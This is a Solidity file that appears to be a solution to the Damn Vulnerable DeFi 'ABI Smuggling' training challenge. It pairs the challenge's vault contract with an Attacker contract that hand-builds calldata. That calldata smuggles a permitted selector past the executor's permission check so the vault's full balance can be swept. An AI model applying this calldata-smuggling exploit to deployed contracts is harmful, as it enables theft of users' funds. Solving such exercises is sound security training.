// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {AuthorizedExecutor} from "./AuthorizedExecutor.sol";

contract SelfAuthorizedVault is AuthorizedExecutor {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp = block.timestamp;

    error TargetNotAllowed();
    error CallerNotAllowed();
    error InvalidWithdrawalAmount();
    error WithdrawalWaitingPeriodNotEnded();

    modifier onlyThis() {
        if (msg.sender != address(this)) {
            revert CallerNotAllowed();
        }
        _;
    }

    /**
     * @notice Allows to send a limited amount of tokens to a recipient every now and then
     * @param token address of the token to withdraw
     * @param recipient address of the tokens' recipient
     * @param amount amount of tokens to be transferred
     */
    function withdraw(address token, address recipient, uint256 amount) external onlyThis {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert WithdrawalWaitingPeriodNotEnded();
        }

        _lastWithdrawalTimestamp = block.timestamp;

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    function sweepFunds(address receiver, IERC20 token) external onlyThis {
        SafeTransferLib.safeTransfer(address(token), receiver, token.balanceOf(address(this)));
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _beforeFunctionCall(address target, bytes memory) internal view override {
        if (target != address(this)) {
            revert TargetNotAllowed();
        }
    }
}

contract Attacker {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public recovery;

    constructor(SelfAuthorizedVault _vault, address _token, address _recovery) {
        vault = _vault;
        token = IERC20(_token);
        recovery = _recovery;
    }

    function attack() external returns (bytes memory) {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        // AuthorizedExecutor.execute checks 0x04 function selector, we will keep it in 0x80
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory empty = abi.encodePacked(uint256(0));
        // Withdraw function selector will be at the 100th byte of calldata (4 + 32*3), so we can pass the permissions check in the execute function
        bytes memory withdrawSelectorPadded = abi.encodePacked(bytes4(0xd9caed12), bytes28(0));
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token);

        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        // Construct the calldata payload for the `execute()` function, use this payload and directly perform low-level call to the vault contract
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector, // 4 bytes
            target, // 32 bytes
            dataOffset, // 32 bytes
            empty, // 32 bytes
            withdrawSelectorPadded, // 32 bytes (starts at the 100th byte)
            actionDataLength, // Length of actionData
            sweepFundsCalldata // The actual calldata to `sweepFunds()`
        );
        return calldataPayload;
    }
}
